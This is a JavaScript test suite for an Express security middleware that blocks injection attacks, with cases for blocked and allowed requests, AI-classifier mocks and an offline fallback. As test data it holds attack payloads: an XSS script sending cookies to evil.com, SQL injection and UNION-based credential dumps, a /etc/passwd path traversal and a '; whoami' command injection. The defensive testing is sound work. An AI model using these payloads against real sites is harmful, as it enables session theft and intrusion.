const { test, describe, before, beforeEach } = require('node:test');
const assert = require('node:assert');
const request = require('supertest');
const express = require('express');
const app = require('../src/app');
const { createSecurityMiddleware } = require('../src/middleware/securityMiddleware');
const { setupMockDb, clearMockDb } = require('./mockDb');
const { resetFrequencyHistory } = require('../src/middleware/rateLimiter');

describe('Phase 7: Security Gateway Middleware Test Suite', () => {
  before(() => {
    setupMockDb();
  });

  beforeEach(() => {
    clearMockDb();
    resetFrequencyHistory();
  });

  describe('1. Gateway Attack Blocking (Deterministic Rules -> HTTP 403)', () => {
    test('should BLOCK SQL injection payload in JSON body with HTTP 403', async () => {
      const res = await request(app)
        .post('/api/auth/login')
        .send({
          email: "admin' OR '1'='1",
          password: 'Password123!',
        });

      assert.strictEqual(res.status, 403);
      assert.strictEqual(res.body.success, false);
      assert.strictEqual(res.body.blocked, true);
      assert.strictEqual(res.body.error, 'Request blocked by SentinelAI Security Engine');
      assert.strictEqual(res.body.securityContext.action, 'BLOCK');
      assert.strictEqual(res.body.securityContext.threatType, 'SQL_INJECTION');
      assert.ok(res.body.securityContext.riskScore >= 65);
      assert.ok(Array.isArray(res.body.securityContext.ruleMatches));
      assert.ok(res.body.securityContext.ruleMatches.length > 0);
    });

    test('should BLOCK Cross-Site Scripting (XSS) payload in JSON body with HTTP 403', async () => {
      const res = await request(app)
        .post('/api/auth/register')
        .send({
          name: '<script>document.location="http://evil.com/?c="+document.cookie</script>',
          email: 'innocent@victim.org',
          password: 'Password123!',
        });

      assert.strictEqual(res.status, 403);
      assert.strictEqual(res.body.blocked, true);
      assert.strictEqual(res.body.securityContext.action, 'BLOCK');
      assert.strictEqual(res.body.securityContext.threatType, 'XSS');
      assert.strictEqual(res.body.securityContext.severity, 'CRITICAL');
      assert.ok(res.body.securityContext.riskScore >= 85);
      assert.ok(res.body.securityContext.ruleMatches.includes('XSS_SCRIPT_TAG'));
    });

    test('should BLOCK Path Traversal payload in URL query parameters with HTTP 403', async () => {
      const res = await request(app)
        .get('/api/users/profile?file=../../../../etc/passwd');

      assert.strictEqual(res.status, 403);
      assert.strictEqual(res.body.blocked, true);
      assert.strictEqual(res.body.securityContext.action, 'BLOCK');
      assert.strictEqual(res.body.securityContext.threatType, 'PATH_TRAVERSAL');
      assert.ok(res.body.securityContext.riskScore >= 65);
      assert.ok(res.body.securityContext.ruleMatches.includes('TRAVERSAL_DOT_DOT_SLASH'));
    });

    test('should BLOCK Command Injection payload in JSON body with HTTP 403', async () => {
      const res = await request(app)
        .post('/api/auth/login')
        .send({
          email: '; whoami',
          password: 'Password123!',
        });

      assert.strictEqual(res.status, 403);
      assert.strictEqual(res.body.blocked, true);
      assert.strictEqual(res.body.securityContext.action, 'BLOCK');
      assert.strictEqual(res.body.securityContext.threatType, 'COMMAND_INJECTION');
      assert.strictEqual(res.body.securityContext.severity, 'CRITICAL');
      assert.ok(res.body.securityContext.riskScore >= 85);
      assert.ok(res.body.securityContext.ruleMatches.includes('CMDI_OPERATOR_WITH_COMMAND'));
    });
  });

  describe('2. Benign Request Pass-Through & Context Attachment (ALLOW)', () => {
    test('should ALLOW normal benign request and attach security context to request', async () => {
      const res = await request(app)
        .post('/api/auth/register')
        .send({
          name: 'Charlie Brown',
          email: 'charlie@sentinelai.local',
          password: 'SecurePassword123!',
        });

      // Successful registration verifies request was not blocked
      assert.strictEqual(res.status, 201);
      assert.strictEqual(res.body.success, true);
      assert.strictEqual(res.body.user.email, 'charlie@sentinelai.local');
    });

    test('should ignore password field characters to prevent false positives on complex passwords', async () => {
      // Passwords with SQL/Shell-like characters should NOT be blocked
      const res = await request(app)
        .post('/api/auth/register')
        .send({
          name: 'Dana White',
          email: 'dana.white@company.com',
          password: 'P@$$w0rd;DROP TABLE users;--',
        });

      assert.strictEqual(res.status, 201);
      assert.strictEqual(res.body.success, true);
    });
  });

  describe('3. AI Microservice Integration & Floor Enforcement', () => {
    test('should BLOCK request when AI model detects attack with high confidence (>= 0.95)', async () => {
      // Create test express app with mock AI client returning high-confidence attack
      const mockAi = {
        predict: async () => ({
          threatType: 'SQL_INJECTION',
          confidence: 0.98,
          modelVersion: 'mock-ai-v1',
          probabilities: { SQL_INJECTION: 0.98, NORMAL: 0.02 },
          available: true,
        }),
      };

      const customMiddleware = createSecurityMiddleware({ aiClient: mockAi });
      const testApp = express();
      testApp.use(express.json());
      testApp.use(customMiddleware);
      testApp.post('/api/submit', (req, res) => res.json({ success: true }));

      const res = await request(testApp)
        .post('/api/submit')
        .send({ comment: 'subtle obfuscated probe' });

      assert.strictEqual(res.status, 403);
      assert.strictEqual(res.body.blocked, true);
      assert.strictEqual(res.body.securityContext.threatType, 'SQL_INJECTION');
      assert.strictEqual(res.body.securityContext.severity, 'CRITICAL');
      assert.ok(res.body.securityContext.riskScore >= 85);
      assert.ok(res.body.securityContext.factors.includes('HIGH_CONFIDENCE_AI_EXPLOIT_FLOOR'));
    });

    test('should ALLOW request when AI model predicts NORMAL with high confidence', async () => {
      let capturedContext = null;
      const mockAi = {
        predict: async () => ({
          threatType: 'NORMAL',
          confidence: 0.99,
          modelVersion: 'mock-ai-v1',
          probabilities: { NORMAL: 0.99 },
          available: true,
        }),
      };

      const customMiddleware = createSecurityMiddleware({ aiClient: mockAi });
      const testApp = express();
      testApp.use(express.json());
      testApp.use(customMiddleware);
      testApp.post('/api/submit', (req, res) => {
        capturedContext = req.securityContext;
        res.json({ success: true });
      });

      const res = await request(testApp)
        .post('/api/submit')
        .send({ query: 'search for documentation' });

      assert.strictEqual(res.status, 200);
      assert.ok(capturedContext !== null);
      assert.strictEqual(capturedContext.action, 'ALLOW');
      assert.strictEqual(capturedContext.threatType, 'NORMAL');
      assert.ok(capturedContext.riskScore <= 29);
    });
  });

  describe('4. Fault Tolerance & Resiliency (AI Service Offline)', () => {
    test('should gracefully handle AI service downtime and still enforce deterministic rules', async () => {
      const offlineAi = {
        predict: async () => ({
          threatType: 'NORMAL',
          confidence: 0.0,
          modelVersion: 'fallback',
          probabilities: {},
          available: false,
          error: 'AI service offline (ECONNREFUSED)',
        }),
      };

      const resilientMiddleware = createSecurityMiddleware({ aiClient: offlineAi });
      const testApp = express();
      testApp.use(express.json());
      testApp.use(resilientMiddleware);
      testApp.post('/api/action', (req, res) => res.json({ success: true }));

      // 1. Attack payload still BLOCKED by rules despite offline AI
      const attackRes = await request(testApp)
        .post('/api/action')
        .send({ data: "' UNION SELECT username, password FROM users --" });

      assert.strictEqual(attackRes.status, 403);
      assert.strictEqual(attackRes.body.blocked, true);
      assert.strictEqual(attackRes.body.securityContext.threatType, 'SQL_INJECTION');

      // 2. Benign payload still ALLOWED despite offline AI
      const benignRes = await request(testApp)
        .post('/api/action')
        .send({ data: "General inquiry regarding account settings" });

      assert.strictEqual(benignRes.status, 200);
      assert.strictEqual(benignRes.body.success, true);
    });
  });

  describe('5. Route Exemptions & Sandbox Inspection', () => {
    test('GET /api/health should bypass security inspection and respond with 200', async () => {
      const res = await request(app).get('/api/health');
      assert.strictEqual(res.status, 200);
      assert.deepStrictEqual(res.body, { status: 'ok' });
    });

    test('POST /api/threats/inspect should return full security analysis without blocking', async () => {
      const res = await request(app)
        .post('/api/threats/inspect')
        .send({
          payload: "SELECT * FROM users WHERE id = 1 UNION SELECT null, null--",
        });

      assert.strictEqual(res.status, 200);
      assert.strictEqual(res.body.success, true);
      assert.strictEqual(res.body.analysis.threatType, 'SQL_INJECTION');
      assert.strictEqual(res.body.analysis.action, 'BLOCK');
      assert.ok(res.body.analysis.riskScore >= 85);
      assert.ok(res.body.analysis.rules.hasMatches);
      assert.ok(Array.isArray(res.body.analysis.rules.matches));
    });

    test('POST /api/threats/inspect should return 400 when payload is missing', async () => {
      const res = await request(app)
        .post('/api/threats/inspect')
        .send({});

      assert.strictEqual(res.status, 400);
      assert.strictEqual(res.body.success, false);
      assert.ok(res.body.error.includes('Payload string is required'));
    });
  });

  describe('6. Suspicious Activity Monitoring & Audit Event Hooks', () => {
    test('should allow request with MONITOR action when risk score is between 30 and 59', async () => {
      let capturedContext = null;
      // Mock risk engine to produce score in MEDIUM (30–59) range
      const mockRisk = {
        calculateRisk: () => ({
          riskScore: 45,
          severity: 'MEDIUM',
          action: 'MONITOR',
          factors: ['MODERATE_ANOMALY_ELEVATION'],
          breakdown: { ai: 0, rule: 25, anomaly: 60, failedAuth: 0, frequency: 0, history: 0 },
        }),
      };

      const monitorMiddleware = createSecurityMiddleware({ riskEngine: mockRisk });
      const testApp = express();
      testApp.use(express.json());
      testApp.use(monitorMiddleware);
      testApp.post('/api/query', (req, res) => {
        capturedContext = req.securityContext;
        res.json({ processed: true });
      });

      const res = await request(testApp)
        .post('/api/query')
        .send({ query: 'unusual data probe' });

      assert.strictEqual(res.status, 200);
      assert.strictEqual(res.body.processed, true);
      assert.ok(capturedContext !== null);
      assert.strictEqual(capturedContext.action, 'MONITOR');
      assert.strictEqual(capturedContext.severity, 'MEDIUM');
      assert.strictEqual(capturedContext.riskScore, 45);
    });

    test('should fire onSecurityEvent callback asynchronously on every evaluated request', async () => {
      const capturedEvents = [];
      const onEvent = (context, req) => {
        capturedEvents.push({ context, method: req.method });
      };

      const eventMiddleware = createSecurityMiddleware({ onSecurityEvent: onEvent });
      const testApp = express();
      testApp.use(express.json());
      testApp.use(eventMiddleware);
      testApp.get('/api/test-event', (req, res) => res.json({ ok: true }));

      await request(testApp).get('/api/test-event');

      assert.strictEqual(capturedEvents.length, 1);
      assert.strictEqual(capturedEvents[0].method, 'GET');
      assert.ok(capturedEvents[0].context.riskScore !== undefined);
      assert.ok(capturedEvents[0].context.action !== undefined);
    });
  });
});
